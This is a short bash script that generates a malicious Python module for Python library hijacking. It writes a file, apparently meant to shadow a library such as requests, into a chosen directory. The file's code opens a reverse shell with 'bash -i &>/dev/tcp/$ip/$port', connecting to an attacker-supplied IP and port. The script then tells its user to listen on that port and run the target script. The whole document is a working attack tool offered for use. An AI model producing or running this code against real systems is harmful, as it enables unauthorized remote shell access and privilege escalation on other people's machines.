#!/bin/bash


function help(){
  echo -e "\n[!] Help use:"
  echo -e "\n\n[i] $0 -v {file_name} {ip} {port} {path}\n"
}

function ctrl_c(){
  echo -e "\n\n[!] Quiting...\n"
  exit 1 
}

trap ctrl_c INT

declare -i counter=0

while getopts "v:h" arg; do
  case $arg in
    v) file_name=$OPTARG; ip=$3; port=$4; path=$5; let counter+=1;;
    h) let counter+=2;;
  esac
done


if [ $counter -eq 1 ]; then
  cd $path
  /usr/bin/touch $file_name.py
  echo -e "import subprocess\n\nsubprocess.Popen([\"bash -c 'bash -i &>/dev/tcp/$ip/$port 0>&1'\"], shell=True)" > $file_name.py  
  chmod +x $file_name.py
  echo "The file requests.py has been created succesfully to make ur LibraryHijacking, please listen on Port $port and run the pwned script"
else
  help
fi


